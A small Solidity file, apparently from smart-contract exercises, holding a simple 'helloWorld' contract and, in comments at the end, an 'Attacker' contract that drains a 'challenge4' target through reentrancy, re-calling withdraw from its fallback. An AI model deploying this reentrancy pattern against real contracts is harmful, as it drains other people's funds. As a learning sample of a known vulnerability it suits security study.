pragma solidity ^0.5.4;

// Say Hi
//Deployed at Ropsten: 0x0f6501d05272b95b8ad35c64f1939626ff01c81d
contract helloWorld {
    //Storage variables
    string public name;
    address private owner;
    //Defining events
    event Hi(string name);

    constructor() public {
        owner = msg.sender;
    }

    function sayHi(string memory _name) public {
        //change the name if owner calls
        if (msg.sender == owner) {
            name = _name;
        }
        //call event
        emit Hi(_name);
    }

    //fallback function.
    function() external {
        emit Hi("Hello World");
    }
}

// contract Attacker {
// challenge4 target;
// constructor(address payable targetAddress) public payable {
// target = challenge4(targetAddress);
// target.donate.value(msg.value)(address(this));
// }
// function attack() public {
// target.withdraw(target.balanceOf(address(this)));
// }
// function () external payable {
// if (address(target).balance >= 1 ether) {
// //The check also can be on gas
// target.withdraw(target.balanceOf(address(this)));
// }
// }
// }
